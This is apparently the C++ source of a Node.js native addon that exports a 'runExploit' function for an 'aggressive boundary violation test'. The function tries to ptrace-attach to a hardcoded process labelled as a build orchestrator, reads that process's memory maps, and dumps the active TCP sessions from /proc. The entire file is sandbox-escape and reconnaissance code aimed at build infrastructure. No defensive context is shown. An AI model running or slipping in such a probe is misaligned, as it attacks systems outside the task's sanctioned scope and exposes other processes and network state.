#include <node_api.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <errno.h>
#include <string>
#include <cstring>

std::string test_ptrace(int target_pid) {
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        return "PTRACE_ATTACH FAILED: " + std::string(strerror(errno));
    }
    waitpid(target_pid, NULL, 0);
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    return "SUCCESS: PTRACE_ATTACH TO PID " + std::to_string(target_pid) + " ALLOWED!";
}

std::string read_proc_mem(int target_pid) {
    std::string path = "/proc/" + std::to_string(target_pid) + "/maps";
    int fd = open(path.c_str(), O_RDONLY);
    if (fd < 0) return "READ_MAPS FAILED: " + std::string(strerror(errno));
    
    char buf[512];
    int n = read(fd, buf, 511);
    close(fd);
    buf[n] = '\0';
    return "MAPS SNIPPET: " + std::string(buf);
}

std::string test_internal_conn() {
    int fd = open("/proc/net/tcp", O_RDONLY);
    if (fd < 0) return "NET_TCP_READ FAILED";
    char buf[1024];
    read(fd, buf, 1023);
    close(fd);
    return "ACTIVE_TCP_SESSIONS: \n" + std::string(buf);
}

napi_value AggressiveTest(napi_env env, napi_callback_info info) {
    std::string report = "--- AGGRESSIVE BOUNDARY VIOLATION TEST ---\n";
    
    report += "[1] PTrace Build Orchestrator: " + test_ptrace(410) + "\n";
    report += "[2] Memory Maps Build: " + read_proc_mem(410) + "\n";    
    report += "[3] Internal Network Leak: " + test_internal_conn() + "\n";

    napi_value res;
    napi_create_string_utf8(env, report.c_str(), report.length(), &res);
    return res;
}

napi_value Init(napi_env env, napi_value exports) {
    napi_property_descriptor desc = { "runExploit", 0, AggressiveTest, 0, 0, 0, napi_default, 0 };
    napi_define_properties(env, exports, 1, &desc);
    return exports;
}

NAPI_MODULE(NODE_GYP_MODULE_NAME, Init)
